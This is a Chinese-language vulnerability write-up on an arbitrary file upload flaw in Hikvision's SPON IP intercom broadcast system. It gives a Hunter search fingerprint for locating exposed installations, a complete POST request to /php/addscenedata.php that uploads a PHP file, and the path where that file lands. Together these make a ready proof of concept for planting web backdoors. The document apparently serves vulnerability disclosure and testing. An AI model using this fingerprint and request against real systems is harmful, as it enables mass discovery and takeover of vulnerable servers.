# 海康威视SPON IP网络对讲广播系统addscenedata存在任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">Hikvision Intercom Broadcasting System是中国海康威视（Hikvision）公司的一个对讲广播系统。海康威视SPON IP网络对讲广播系统addscenedata存在任意文件上传漏洞，恶意攻击者可能会上传恶意的后门文件，使服务器失陷。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 海康威视SPON IP网络对讲广播系统

# 三、资产测绘
+ Hunter：`web.body="vendors/custom/html5.min.js"`
+ 特征

![1704857140903-8dadddb1-8d90-42a6-9179-3cd4dca00c8b.png](./img/0NNFrB2N2TFVw-Ep/1704857140903-8dadddb1-8d90-42a6-9179-3cd4dca00c8b-210262.png)

# 四、漏洞复现
```java
POST /php/addscenedata.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Connection: close
Content-Length: 218
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4LuoBRpTiVBo9cIQ
Accept-Encoding: gzip

------WebKitFormBoundary4LuoBRpTiVBo9cIQ
Content-Disposition: form-data; name="upload"; filename="tt.php"
Content-Type: text/plain

123
------WebKitFormBoundary4LuoBRpTiVBo9cIQ--
```

![1704857585745-e3b20507-4f5a-4331-a42b-b30b4fa09640.png](./img/0NNFrB2N2TFVw-Ep/1704857585745-e3b20507-4f5a-4331-a42b-b30b4fa09640-505659.png)

上传文件位置

```java
/images/scene/tt.php
```

![1704857616251-0aa885ce-2985-4d09-8ed3-a968ca4a8fac.png](./img/0NNFrB2N2TFVw-Ep/1704857616251-0aa885ce-2985-4d09-8ed3-a968ca4a8fac-207072.png)



> 更新: 2024-02-29 23:57:17  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fv7cprclagh53ls1>